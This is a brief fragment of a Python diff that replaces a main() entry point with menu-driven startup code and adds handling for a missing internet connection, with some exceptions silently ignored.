-except PermissionError:
-	pass
-	
-if not os.path.exists('.fam'):
-	main()
-else:
-	main()
+        menu()
+except requests.exceptions.ConnectionError:
+        print('\n No internet connection ...')
+        exit()
+except Exception as e:pass
+Menu()
